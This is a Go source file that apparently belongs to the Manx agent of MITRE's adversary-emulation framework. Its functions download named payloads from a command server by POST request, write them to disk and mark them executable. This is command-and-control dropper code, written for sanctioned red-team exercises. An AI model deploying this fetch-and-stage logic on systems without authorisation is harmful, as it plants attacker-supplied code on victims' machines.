package commands

import (
	"fmt"
	"strings"
	"os"
	"io"
	"net/http"
	"runtime"
	"path/filepath"

	"github.com/mitre/manx/shells/output"
)

//DropPayloads downloads all required payloads for a command
func DropPayloads(payload string, server string) []string{
	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, drop(server, payload))
		}
	}
	return droppedPayloads
}

// Exists checks for a file
func Exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

//WritePayload creates a payload on disk
func WritePayload(location string, resp *http.Response) {
	dst, _ := os.Create(location)
	defer dst.Close()
	_, _ = io.Copy(dst, resp.Body)
	os.Chmod(location, 0500)
}

func drop(server string, payload string) string {
	location := filepath.Join(payload)
	if len(payload) > 0 && Exists(location) == false {
		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			WritePayload(location, resp)
		}
	}
	return location
}